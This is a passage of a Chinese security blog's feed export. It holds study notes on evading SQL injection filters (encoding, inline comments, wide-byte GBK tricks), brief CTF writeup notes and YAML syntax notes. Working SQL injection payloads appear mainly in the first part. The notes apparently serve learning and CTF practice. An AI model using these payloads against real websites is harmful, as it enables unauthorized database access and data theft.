not绕过：</span><br></pre></td></tr></table></figure></p><p>and=&amp;&amp;  or=||   xor=|   not=!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 7.绕过注释符号（#，--(后面跟一个空格））过滤：</span><br></pre></td></tr></table></figure></p><p>id=1’ union select 1,2,3||’1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　最后的or &apos;1闭合查询语句的最后的单引号，或者：</span><br></pre></td></tr></table></figure></p><p>id=1’ union select 1,2,’3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 8.=绕过：</span><br><span class="line"></span><br><span class="line">　　使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</span><br><span class="line"></span><br><span class="line">## 9.绕过union，select，where等：</span><br><span class="line"></span><br><span class="line">### （1）使用注释符绕过：</span><br><span class="line"></span><br><span class="line">　　常用注释符：</span><br></pre></td></tr></table></figure></p><p>//，– , /**/, #, –+, – -, ;,%00,–a<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　用法：</span><br></pre></td></tr></table></figure></p><p>U/<strong>/ NION /</strong>/ SE/<strong>/ LECT /</strong>/user，pwd from user<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### （2）使用大小写绕过：</span><br></pre></td></tr></table></figure></p><p>id=-1’UnIoN/**/SeLeCT<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### （3）内联注释绕过：</span><br></pre></td></tr></table></figure></p><p>id=-1’/<em>!UnIoN</em>/ SeLeCT 1,2,concat(/<em>!table_name</em>/) FrOM /<em>information_schema</em>/.tables /<em>!WHERE </em>//<em>!TaBlE_ScHeMa</em>/ like database()#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### （4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</span><br></pre></td></tr></table></figure></p><p>id=-1’UNIunionONSeLselectECT1,2,3–-<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 10.通用绕过（编码）：</span><br><span class="line"></span><br><span class="line">　　如URLEncode编码，ASCII,HEX,unicode编码绕过：</span><br></pre></td></tr></table></figure></p><p>or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 11.等价函数绕过：</span><br><span class="line"></span><br><span class="line">[![复制代码](../../images/sql注入/copycode.gif)](javascript:void(0);)</span><br></pre></td></tr></table></figure></p><p>hex()、bin() ==&gt; ascii()</p><p>sleep() ==&gt;benchmark()</p><p>concat_ws()==&gt;group_concat()</p><p>mid()、substr() ==&gt; substring()</p><p>@@user ==&gt; user()</p><p>@@datadir ==&gt; datadir()</p><p>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　</p><p>或者：<br>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[![复制代码](../../images/sql注入/copycode.gif)](javascript:void(0);)</span><br><span class="line"></span><br><span class="line">## 12.宽字节注入：</span><br><span class="line"></span><br><span class="line">　　过滤 &apos; 的时候往往利用的思路是将 &apos; 转换为 \&apos; 。</span><br><span class="line"></span><br><span class="line">　　在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</span><br><span class="line"></span><br><span class="line">　　（1）%df 吃掉 \ 具体的方法是 urlencode(&apos;\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，he而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&apos;）符号在外面：</span><br></pre></td></tr></table></figure></p><p>id=-1%df%27union select 1,user(),3–+<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　（2）将 \&apos; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</span><br><span class="line"></span><br><span class="line">### 一般产生宽字节注入的PHP函数：</span><br><span class="line"></span><br><span class="line">   1.replace（）：过滤 &apos; \ ，将 &apos; 转化为 \&apos; ，将 \  转为 \\，将 &quot; 转为 \&quot; 。用思路一。</span><br><span class="line"></span><br><span class="line">  2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&apos; , &quot; , \ 。用思路一</span><br><span class="line"></span><br><span class="line">（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</span><br><span class="line"></span><br><span class="line">　3.mysql_real_escape_string()：转义下列字符：</span><br></pre></td></tr></table></figure></p><p>\x00     \n     \r     \     ‘     “     \x1a<br><code>`</code></p><p>（防御，将mysql设置为gbk即可）</p><p>来自: <a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p><img src="/Ctf_web/../../images/sql注入/669054-20160811222209187-1070797218.png" alt="img"></p><p><a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5762961.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;笔记&lt;/p&gt;
    
    </summary>
    
      <category term="安全" scheme="http://blog.wendelltong.xyz/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="ctf" scheme="http://blog.wendelltong.xyz/tags/ctf/"/>
    
      <category term="sql" scheme="http://blog.wendelltong.xyz/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>网安比赛程序逻辑</title>
    <link href="http://blog.wendelltong.xyz/old_post/%E7%BD%91%E5%AE%89%E6%AF%94%E8%B5%9B%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91.html"/>
    <id>http://blog.wendelltong.xyz/old_post/网安比赛程序逻辑.html</id>
    <published>2019-05-01T11:38:32.000Z</published>
    <updated>2019-05-03T15:45:29.000Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="杂乱" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82%E4%B9%B1/"/>
    
    
  </entry>
  
  <entry>
    <title>bugctf综合题目整理</title>
    <link href="http://blog.wendelltong.xyz/old_post/ctf/%E5%8D%97%E9%82%AEctf%E9%87%8D%E5%81%9A%20(copy).html"/>
    <id>http://blog.wendelltong.xyz/old_post/ctf/南邮ctf重做 (copy).html</id>
    <published>2019-04-28T04:00:24.000Z</published>
    <updated>2019-06-16T14:54:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>把综合的题目归纳整理一下,整理思路和方法.<br><a id="more"></a></p><h3 id="江湖魔头"><a href="#江湖魔头" class="headerlink" title="江湖魔头"></a>江湖魔头</h3><p>属性是加密存在cookie里的,js里面有解密脚本,自己构造属性后提交,注意不能直接构造字符串,要写在文件,读取,然后编码,可能是因为二进制的问题??然后可以拿到flag,我的代码基础还是太弱了</p><h3 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h3><p>cbc字节翻转攻击</p><p>cbc加密模式分组加密,iv加密第一组,第一组密文加密第二组以此类推</p><p>然后可以通过修改n-1组的密文,修改解密后n组的值,由于cookie可以控制初始化向量iv,因此可以修改任意值</p><p>通过admiN登录,然后把N改成n</p><p>## </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;把综合的题目归纳整理一下,整理思路和方法.&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="ctf" scheme="http://blog.wendelltong.xyz/tags/ctf/"/>
    
      <category term="writeup" scheme="http://blog.wendelltong.xyz/tags/writeup/"/>
    
      <category term="南邮ctf" scheme="http://blog.wendelltong.xyz/tags/%E5%8D%97%E9%82%AEctf/"/>
    
  </entry>
  
  <entry>
    <title>南邮bugctf重做</title>
    <link href="http://blog.wendelltong.xyz/old_post/ctf/%E5%8D%97%E9%82%AEctf%E9%87%8D%E5%81%9A.html"/>
    <id>http://blog.wendelltong.xyz/old_post/ctf/南邮ctf重做.html</id>
    <published>2019-04-28T04:00:24.000Z</published>
    <updated>2019-07-17T08:49:43.000Z</updated>
    
    <content type="html"><![CDATA[<p>根据学长的指引，尽量不看别人的writeup，把南邮，bugctf重做一遍,然后把题目归纳整理一下<br><a id="more"></a></p><h1 id="综合题目-其实是不知道怎么分类"><a href="#综合题目-其实是不知道怎么分类" class="headerlink" title="综合题目(其实是不知道怎么分类)"></a>综合题目(其实是不知道怎么分类)</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1. 签到题"></a>1. 签到题</h2><p>看源码</p><h2 id="2-MD5-collision"><a href="#2-MD5-collision" class="headerlink" title="2.MD5 collision"></a>2.MD5 collision</h2><p>md5碰撞，md5(‘QNKCDZO’) 加密出来0e 开头，比较又是==，弱类型比较，会转化成数字0，因此相等</p><p>弱类型比较，php会在字符和数组比较时，把字符转成数字，例子 ‘1admin’ 转成 1，’admin1’ 转成 0</p><p>特别的，如果字符串中有e，E,则会按照科学记数法解释</p><p>附录:<a href="https://www.php.net/manual/zh/types.comparisons.php" target="_blank" rel="noopener">php类型比较表</a></p><h2 id="3-签到题2"><a href="#3-签到题2" class="headerlink" title="3.签到题2"></a>3.签到题2</h2><p>html限制了输入长度,直接改掉就行</p><h2 id="4-这题不是web"><a href="#4-这题不是web" class="headerlink" title="4.这题不是web"></a>4.这题不是web</h2><p>杂项吧,看图片源码,base64解码,拿到flag</p><h2 id="5-层层递进"><a href="#5-层层递进" class="headerlink" title="5. 层层递进"></a>5. 层层递进</h2><p>进了几个页面,最后<img src="/old_post/ctf/./南邮ctf重做/image-20190528141335260.png" alt="image-20190528141335260"></p><p>得到flag</p><p>不太懂这道题的考点,分析所有网页源码?</p><h2 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h2><p>javascript利用颜文字加密,解码或者直接运行就行</p><p>开始因为谷歌浏览器自动编码被坑了半天,应该是原unicode编码</p><p>aaencode是js加密的一种特别好玩，可以吧文字加密成表情<br>除了aaencode之外还有几种特别的加密方式</p><p>Perl的ppencode<br>Ruby的rrencode</p><p>编码连接如下：<a href="http://www.cnblogs.com/android-html5/archive/2011/02/09/2533784.html" target="_blank" rel="noopener">http://www.cnblogs.com/android-html5/archive/2011/02/09/2533784.html</a></p><p>在这里推荐一下这个网站：</p><p><a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a></p><p>本题用的是这个网站下面的一个解密算法：</p><p><a href="http://ctf.ssleye.com/aaencode.html" target="_blank" rel="noopener">http://ctf.ssleye.com/aaencode.html</a></p><p>这里有console的好玩用法：<a href="http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html" target="_blank" rel="noopener">http://www.cnblogs.com/Wayou/p/chrome-console-tips-and-tricks.html</a> </p><h2 id="单身20年"><a href="#单身20年" class="headerlink" title="单身20年"></a>单身20年</h2><p>网页中间会有一个跳转,看google调试控制台,或者burp 历史记录</p><h2 id="单身100年也没有用"><a href="#单身100年也没有用" class="headerlink" title="单身100年也没有用"></a>单身100年也没有用</h2><p>跟上面一样</p><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>根据提示,看robots文件,然后构造1024.1就行</p><h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p>XFF头? 没成功,</p><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>header头直接看到flag</p><h2 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h2><p>jsfuck,终端跑一下,得到php地址,提示在脑袋里里,看header头,,bash_history 访问之,提示一个zip文件，下载就好了</p><h2 id="综合题二"><a href="#综合题二" class="headerlink" title="综合题二"></a>综合题二</h2><p>本CMS 存在文件包含,读源码,记得about本身,然后发现loginxlcteam目录,是后台,so.php 那里有一个注入,过滤可以双写绕过,拿到密码登录,提示有一句话木马</p><p>利用php 回调函数实现的不太懂,登深入学php在研究吧,然后利用一句话看当前目录拿到flag,</p><p><a href="https://www.cnblogs.com/hookjoy/p/4973395.html" target="_blank" rel="noopener">php回调函数实现后门</a></p><h2 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h2><p>根据提示submit.php 读异常退出文件,token传0e12345678 拿到flag</p><h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>扫目录,得到shel地址,爆破</p><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>利用union构建密码登录,反弹shell,拿到flag</p><h2 id="login3-SKCTF"><a href="#login3-SKCTF" class="headerlink" title="login3(SKCTF)"></a>login3(SKCTF)</h2><p>bool盲注有时间研究吧</p><h1 id="php安全"><a href="#php安全" class="headerlink" title="php安全"></a>php安全</h1><h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><p>弱类型比较,没意思</p><p>传数组,或者0e碰撞</p><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>把post数组的变量引入全局,存在覆盖原变量问题</p><h2 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h2><p><img src="/old_post/ctf/../../../image-20190717160925330.png" alt="image-20190717160925330">url双重编码绕过</p><h2 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h2><p>传数组</p><h2 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h2><p>16进制绕过字符检查</p><h2 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h2><p>00截断,或者传入数组没什么</p><h2 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h2><p>php 反序列化</p><h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>变量覆盖,get覆盖掉就行</p><h1 id="服务端安全"><a href="#服务端安全" class="headerlink" title="服务端安全"></a>服务端安全</h1><h2 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h2><h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>看源码主要闭合用了’)</p><h3 id="GBK-Injection"><a href="#GBK-Injection" class="headerlink" title="GBK Injection"></a>GBK Injection</h3><p>宽字节注入.没什么</p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>大概思路用\闭合是username 的单引号失效,然后password 的变量就可控制了</p><h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>构造sql语句<img src="/old_post/ctf/南邮ctf重做/image-20190601122949797-3351289.png" alt="image-20190601122949797"></p><h3 id="sql-Injection"><a href="#sql-Injection" class="headerlink" title="sql Injection"></a>sql Injection</h3><p>看源码 用了htimhtmlentities($str, ENT_QUOTES)</p><p>没有过滤/,利用/闭合单引号,</p><p>传入是username=\&amp;password=or 1=1%23 </p><p>这样子 sql语句就变成了</p><p>SELECT * FROM users WHERE name=’\‘ AND pass=’ or 1= 1#’;</p><h3 id="SQL注入2-1"><a href="#SQL注入2-1" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>提示了联合查询,union 自己构造一个pw=1传入就行</p><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>可以控制的是dir和filename</p><p>dir处改1.php后面00截断</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>include 直接包含文件,利用php 伪协议直接读各种源码</p><h3 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h3><p>Php伪协议,input</p><h3 id="donwlload"><a href="#donwlload" class="headerlink" title="donwlload~!"></a>donwlload~!</h3><p>服务器进不去了,看了writeup 下载链接里的文件base64 编码,按照编码下载download.php就行</p><h2 id="权限与认证"><a href="#权限与认证" class="headerlink" title="权限与认证"></a>权限与认证</h2><h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>url参数base64转码,伪造admin</p><p>###COOKIE</p><p>改cookie就行,cookie和session不一样,想起来以前django伪造session的题目,难题也是简单题目演变出来的</p><p><img src="/old_post/ctf/../../images/南邮ctf重做/image-20190717164936834.png" alt="image-20190717164936834"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;根据学长的指引，尽量不看别人的writeup，把南邮，bugctf重做一遍,然后把题目归纳整理一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="ctf" scheme="http://blog.wendelltong.xyz/tags/ctf/"/>
    
      <category term="writeup" scheme="http://blog.wendelltong.xyz/tags/writeup/"/>
    
      <category term="南邮ctf" scheme="http://blog.wendelltong.xyz/tags/%E5%8D%97%E9%82%AEctf/"/>
    
  </entry>
  
  <entry>
    <title>XSS读书笔记</title>
    <link href="http://blog.wendelltong.xyz/old_post/XSS%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0.html"/>
    <id>http://blog.wendelltong.xyz/old_post/XSS读书笔记.html</id>
    <published>2019-04-23T09:20:18.000Z</published>
    <updated>2019-05-30T03:17:48.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="Web安全" scheme="http://blog.wendelltong.xyz/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://blog.wendelltong.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="ctf" scheme="http://blog.wendelltong.xyz/tags/ctf/"/>
    
      <category term="xss" scheme="http://blog.wendelltong.xyz/tags/xss/"/>
    
      <category term="html" scheme="http://blog.wendelltong.xyz/tags/html/"/>
    
      <category term="读书笔记" scheme="http://blog.wendelltong.xyz/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>YAML语法笔记</title>
    <link href="http://blog.wendelltong.xyz/old_post/YAML%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0.html"/>
    <id>http://blog.wendelltong.xyz/old_post/YAML语法笔记.html</id>
    <published>2019-04-23T01:23:07.000Z</published>
    <updated>2019-04-23T10:51:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记<br><a id="more"></a></p><h1 id="基本规则"><a href="#基本规则" class="headerlink" title="基本规则"></a>基本规则</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><ul><li>大小写敏感</li><li>文档使用unicede 编码，utf-8</li><li>使用缩进表示层级关系，只允许使用空格，不允许缩进</li><li>同层级元素左对齐，空格数目不重要</li><li>#注释</li></ul><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="序列（相当于列表）"><a href="#序列（相当于列表）" class="headerlink" title="序列（相当于列表）"></a>序列（相当于列表）</h3><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    - 灰蓝</span><br><span class="line">    - 蓝</span><br><span class="line">    - 黑</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">[灰蓝，蓝]</span><br></pre></td></tr></table></figure></code></pre><h3 id="键值表（字典）"><a href="#键值表（字典）" class="headerlink" title="键值表（字典）"></a>键值表（字典）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name: 惠兰</span><br><span class="line">age: 0</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&#123;name:惠兰,age:0&#125;</span><br></pre></td></tr></table></figure><p>“? “ 问号+空格表示复杂的键。当键是一个列表或键值表时，就需要使用本符号来标记。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 使用一个列表作为键</span><br><span class="line">? [blue, reg, green]: Color </span><br><span class="line"># 等价于 </span><br><span class="line">? - blue   </span><br><span class="line">  - reg   </span><br><span class="line">  - gree </span><br><span class="line">: Color</span><br></pre></td></tr></table></figure><h3 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h3><ul><li>字符串</li><li>整数</li><li>浮点型</li><li>布尔型</li><li>null</li><li>时间</li><li>日期<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># test.yaml</span><br><span class="line">#这个例子输出一个字典，其中value包括所有基本类型</span><br><span class="line">str: &quot;Hello World!&quot;</span><br><span class="line">int: 110</span><br><span class="line">float: 3.141</span><br><span class="line">boolean: true  # or false</span><br><span class="line">None: null  # 也可以用 ~ 号来表示 null</span><br><span class="line">time: 2016-09-22t11:43:30.20+08:00  # ISO8601，写法百度</span><br><span class="line">date: 2016-09-22  # 同样ISO8601</span><br></pre></td></tr></table></figure></li></ul><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;date&apos;: datetime.date(2016, 9, 22), &apos;None&apos;: None, &apos;boolean&apos;: True, &apos;str&apos;: &apos;Hello World!&apos;, &apos;time&apos;: datetime.datetime(2016, 9, 22, 3, 43, 30, 200000), &apos;int&apos;: 110, &apos;float&apos;: 3.141&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">integer: 12345     # 整数标准形式</span><br><span class="line">octal: 0o34        # 八进制表示，第二个是字母 o</span><br><span class="line">hex: 0xFF          # 十六进制表示</span><br><span class="line"></span><br><span class="line">float: 1.23e+3     # 浮点数</span><br><span class="line">fixed: 13.67       # 固定小数</span><br><span class="line">minmin: -.inf      # 表示负无穷</span><br><span class="line">notNumber: .NaN    # 无效数字</span><br><span class="line"></span><br><span class="line">null:              # 空值</span><br><span class="line">boolean: [true, false] # 布尔值</span><br><span class="line">string: ‘12345‘    # 字符串</span><br><span class="line"></span><br><span class="line">date: 2015-08-23   # 日期</span><br><span class="line">datetime: 2015-08-23T02:02:00.1z  # 日期时间</span><br><span class="line">iso8601: 2015-08-23t21:59:43.10-05:00  # iso8601 日期格式</span><br><span class="line">spaced: 2015-08-23 21:59:43.10 -5      # ?</span><br></pre></td></tr></table></figure><p>“!”（叹号）显式指示类型，或自定义类型标识。单叹号通常是自定义类型，双叹号是内置类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">isString: !!str 2015-08-23     # 强调是字符串不是日期数据</span><br><span class="line">picture: !!binary |            # Base64  图片</span><br><span class="line">    R0lGODlhDAAMAIQAAP//9/X</span><br><span class="line">    17unp5WZmZgAAAOfn515eXv</span><br><span class="line">    Pz7Y6OjuDg4J+fn5OTk6enp</span><br><span class="line">    56enmleECcgggoBADs=</span><br><span class="line">#下面是内置类型</span><br><span class="line">!!int               # 整数类型</span><br><span class="line">!!float             # 浮点类型</span><br><span class="line">!!bool              # 布尔类型</span><br><span class="line">!!str               # 字符串类型</span><br><span class="line">!!binary            # 也是字符串类型</span><br><span class="line">!!timestamp         # 日期时间类型</span><br><span class="line">!!null              # 空值</span><br><span class="line">!!set               # 集合</span><br><span class="line">!!omap, !!pairs     # 键值列表或对象列表</span><br><span class="line">!!seq               # 序列，也是列表</span><br><span class="line">!!map               # 键值表</span><br><span class="line">#下面是一些例子：</span><br><span class="line">--- !!omap</span><br><span class="line">- Mark: 65</span><br><span class="line">- Sammy: 63</span><br><span class="line">- Key: 58</span><br><span class="line">--- !!set           # 注意，“?”表示键为列表，在这里列表为 null</span><br><span class="line">? Mark</span><br><span class="line">? Sammy</span><br><span class="line">? Key</span><br><span class="line"># 下面是自定义的类型或标识</span><br><span class="line">%TAG ! tag:clarkevans.com,2002:   # % 是指令符号</span><br><span class="line">--- !shape</span><br><span class="line"># Use the ! handle for presenting</span><br><span class="line"># tag:clarkevans.com,2002:circle</span><br><span class="line">- !circle</span><br><span class="line">  center: &amp;ORIGIN &#123;x: 73, y: 129&#125;</span><br><span class="line">  radius: 7</span><br><span class="line">- !line</span><br><span class="line">  start: *ORIGIN</span><br><span class="line">  finish: &#123; x: 89, y: 102 &#125;</span><br><span class="line">- !label</span><br><span class="line">  start: *ORIGIN</span><br><span class="line">  color: 0xFFEEBB</span><br><span class="line">  text: Pretty vector drawing</span><br></pre></td></tr></table></figure></p><h3 id="字符串"><a 